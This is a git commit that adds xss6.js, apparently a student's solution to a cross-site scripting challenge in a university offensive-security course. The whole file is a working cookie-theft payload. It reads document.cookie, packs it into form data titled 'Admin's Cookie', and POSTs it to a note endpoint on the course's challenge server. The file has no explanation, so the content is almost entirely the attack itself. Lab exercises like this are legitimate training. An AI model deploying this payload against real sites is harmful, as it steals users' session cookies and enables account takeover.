6145be55e8db0ad01c320703b8ed4d91830289a1
Yegor <36862422+yCherny@users.noreply.github.com>
2022-09-20 08:59:04 -0400

    Create xss6.js

---
+++ xss6.js
@@ -0,0 +1,14 @@
+// NetID; yc5109
+
+// Attempting to Get Session Cookies
+const currentCookies = document.cookie;
+console.log(currentCookies);
+
+// New Form Data Generation
+const formData = new FormData();
+formData.append("title", "Admin's Cookie");
+formData.append("content", currentCookies);
+
+const request = new XMLHttpRequest();
+request.open("POST", "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/view/16");
+request.send(formData);
